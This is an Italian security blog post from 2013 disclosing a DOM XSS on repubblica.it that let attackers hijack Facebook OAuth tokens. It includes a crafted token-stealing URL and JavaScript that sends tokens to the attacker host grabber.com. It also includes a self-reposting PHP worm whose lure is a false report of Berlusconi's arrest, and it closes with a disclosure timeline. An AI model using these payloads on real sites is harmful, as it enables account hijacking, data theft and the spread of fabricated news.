---
date: 2013-07-17 17:03:00
layout: post
slug: 2013-07-17-facebook-oauth-token-hijacking-via-repubblica-it-xss
title: 'Facebook OAuth token hijacking via repubblica.it XSS'
pygmentize: True
categories:
- Networking
- News
- Pentesting
- Security
- Software
tags:
- pentesting
- security
- oauth
- xss
- vulnerability
- repubblica.it
- openredirect
---

Facebook utilizza il protocollo OAuth per far comunicare le applicazioni e gli utenti della piattaforma allo scopo di autorizzare le applicazioni ad accedere alle informazioni e funzionalità dei profili degli utenti. Una debolezza del protocollo OAuth, in compresenza di vulnerabilità [open redirect](https://www.owasp.org/index.php/Open_redirect) o [XSS](https://www.owasp.org/index.php/XSS) nel dominio web di una applicazione Facebook, permette ad un attaccante esterno di impersonare tale applicazione e di guadagnare i permessi ad essa concessi dagli utenti, come leggere i dati personali, accedere a messaggi privati e pubblicare nelle bacheche.

Queste e altre debolezze di OAuth sono state evidenziate nell'ultimo anno dagli ottimi ricercatori [Nir Goldshlager](http://www.breaksec.com) e [Egor Homakov](http://homakov.blogspot.co.il) che hanno pubblicato diversi articoli sulle [vulnerabilità](http://homakov.blogspot.co.il/2013/03/redirecturi-is-achilles-heel-of-oauth.html) [intrinseche](http://homakov.blogspot.co.il/2013/02/hacking-facebook-with-oauth2-and-chrome.html) al [protocollo](http://www.breaksec.com/?p=6039) OAuth.

Vediamo un caso pratico dove un XSS nel dominio web di una applicazione [molto usata](http://www.appdata.com/apps/facebook/182234715127717-la-repubblica) come Repubblica.it permette di creare un *facebook worm* capace di replicarsi e collezionare informazioni degli utenti. Le elucubrazioni contenute in questo articolo sono state fatte con l'aiuto dell'amico e ricercatore di sicurezza [Francesco Manzoni](http://francescomanzoni.com/).

# Facebook OAuth
Come già detto, la piattaforma Facebook utilizza OAuth per autorizzare le applicazioni ad accedere ai profili degli utenti. Ogni applicazione può accedere solo ai permessi che l'utente ha accettato alla sottoscrizione, come la lettura delle informazioni del profilo, lettura dei messaggi privati, accesso alle informazioni sugli amici, o la possibilità di pubblicare post sulla bacheca.

L'autorizzazione data alla applicazione esterna avviene con un passaggio di un token univoco temporaneo che l'utente chiede a Facebook, poi inviato al sito dell'applicazione con un semplice redirect. Una volta che l'applicazione riceve il token temporaneo, può accedere alle risorse dell'utente che gli sono permesse via Facebook API. Facciamo l'esempio con l'applicazione facebook di Repubblica.it.

![OAuth]( {{ site.url }}/assets/img/oauth1.png)

# VULNERABILITY

Il token viene passato tra i tre attori con delle semplici richieste GET, a cui viene aggiunto come [fragment](http://en.wikipedia.org/wiki/Fragment_identifier), dopo il carattere `#`. Anche l'indirizzo CALLBACK\_URL su cui viene redirezionato il browser utente per consegnare il token a Repubblica.it viene passato come parametro nel parametro `next` della GET. 

Queste specifiche di OAuth permettono ad un attaccante di forgiare un link particolare che se visitato dall'utente forza il browser a richiedere a Facebook il token autenticativo, per poi inviarlo all'attaccante esterno via una CALLBACK\_URL vulnerabile di XSS o di open redirect. Da questo momento l'attaccante possiede il token con cui per un tempo limitato può sottrarre informazioni private dell'utente, postare nella sua bacheca utente e fare ciò che i permessi dell'applicazione consentono.

![Attacco a OAuth]( {{ site.url }}/assets/img/oauth2.png)


# EXPLOIT

## TOKEN HIJACKING

Per sfruttare la vulnerabilità, è necessaria un XSS o open redirect presente nel dominio che Facebook associa alla applicazione, in questo caso Repubblica.it. Prevedibilmente l'XSS, per di più DOM, è presente nel dominio repubblica.it questo indirizzo:

```html
http://www.repubblica.it/static/includes/common/interstitial.html?href=javascript:alert("Yeah");
```

Procurata l'app\_id della applicazione di repubblica, `182234715127717`, abbozziamo la richiesta di token verso facebook

```html
https://www.facebook.com/dialog/permissions.request?app_id=182234715127717&display=page&next=&response_type=token&fbconnect=1#sthash.q5jXmpqn.dpuf
```

Inseriamo la url vulnerabile nel XSS nel parametro che indica la CALLBACK\_URL, ovvero `next`. In questo modo il browser dell'utente che fa la richiesta del token, viene poi ridirezionato all'indirizzo specificato in CALLBACK\_URL, col quale estraiamo il token eseguendo via XSS il comando javascript `alert(window.location.hash);`:

```html
https://www.facebook.com/dialog/permissions.request?app_id=182234715127717&display=page&next=http://www.repubblica.it/static/includes/common/interstitial.html?href=javascript:alert(window.location.hash);&response_type=token&fbconnect=1#sthash.q5jXmpqn.dpuf`
```

![alert token]( {{ site.url }}/assets/img/oauth3.png )

Siamo riusciti nell'intento di estrarre il token utilizzando il codice javascript iniettato nel XSS. Invece di mostrarlo a schermo, inviamolo allo script PHP dell'attacante installato su una terza macchina, l'host *grabber.com* nell'ultimo grafico. Componiamo il comando javascript con qualche piccolo hack per facilitare l'hijacking verso *grabber.com*: 

* Per inviare il token a un url esterno senza problemi di same origin policy, carichiamo nel documento una finta immagine da `grabber.com/token.php` 
* Rimuoviamo il carattere `#` in modo che il token venga inviato come parametro della GET access_token
* Concateniamo la stringa finale con un `join` evitando di utilizzare i `+` che andrebbero persi nell'URL encoding delle diverse richieste

Il javascript da iniettare nella pagina vulnerabile diventa quindi 

```{javascript}
javascript:document.write(["<img ","src='","http://grabber.com/token.php?",window.location.hash.replace(String.fromCharCode(35),''),"'/>"].join(''));
```


## FACEBOOK WORM

Il grabber esterno, a seconda dei permessi dati alla applicazione dagli utenti, può collezionare dati privati, i messaggi e ripostarsi nelle bacheche degli utenti che visitano il link malevolo. **Perchè il worm possa ripostarsi, è necessario che in precedenza l'utente abbia approvato il permesso di scrivere in bacheca richiesto da repubblica.it**. In questa dimostrazione limitiamoci a repostare il link allo scopo di creare un *facebook worm*. Bastano una finta notizia un pò *catchy* e poche linee di codice PHP per creare un post che si riposta automaticamente nella bacheca di chiunque lo clicchi.

```{php}
<?
if (!array_key_exists('access_token', $_GET)) die();
$access_token=$_GET['access_token'];

file_put_contents('fbout.txt', $access_token .' ' , FILE_APPEND);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://graph.facebook.com/me/feed");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, array(
    'name' => 'Sentenze manipolate, manette per Silvio Berlusconi',
    'caption' => 'repubblica.it',
    'description' => 'La Guardia di Finanza di Milano ha eseguito nel pomeriggio un ordine di arresto nei confronti del cavaliere Silvio Berlusconi, reo di avere corrotto ',
    'link' => 'https://www.facebook.com/dialog/permissions.request?app_id=182234715127717&display=page&next=http://www.repubblica.it/static/includes/common/interstitial.html?href=javascript:document.write(["<img ","src=\'","http://grabber.com/token.php?",window.location.hash.replace(String.fromCharCode(35),""),"\'/>"].join(\'\'));&response_type=token&fbconnect=1#sthash.q5jXmpqn.dpuf',
    'picture' => 'http://www.repubblica.it/images/2013/03/13/094653287-01e6777c-9cdb-46f1-b7c5-694920034ad8.jpg',
    'access_token' => $access_token
));

echo curl_exec($ch);
curl_close($ch);

?>
```


![Repost]( {{ site.url }}/assets/img/oauth4.png)

Il risultato è di indubbio effetto e in grado di ripostarsi in poco tempo in maniera esponenziale. Un token grabber più elaborato potrebbe facilmente raccogliere tutte le informazioni possibili da ogni profilo bucato, e in caso di applicazioni autorizzate ad accedere alla mailbox utente, addirittura fare un dump di tutti i messaggi privati degli utenti che visitano il link.

Lato Facebook il baco è difficile da estirpare, le specifiche di OAuth permettono il passaggio del token via GET, ed chi si occupa di sicurezza delle web application sa che la gran parte dei siti contengono vulnerabilità XSS o open redirect. Lato utente rimane sempre la buona abitudine di non cliccare link sospetti, e di provvedere immediatamente alla cancellazione nel caso si noti una inaspettata viralità del post nelle bacheche dei propri contatti.


#### Disclosure:
*4 Luglio 2013: Segnalata vulnerabilità alla mail helpdesk del sito di Repubblica.it, nessuna risposta.*
*11 Luglio 2013: Segnalata vulnerabilità a 3 mail di amministratori, nessuna risposta.*
*17 Luglio 2013: Pubblicazione della vulnerabilità.*
*19 luglio 2013: Dopo un gentile scambio di mail con i tecnici di Repubblica.it, verifico che il DOM XSS è stato fixato.*
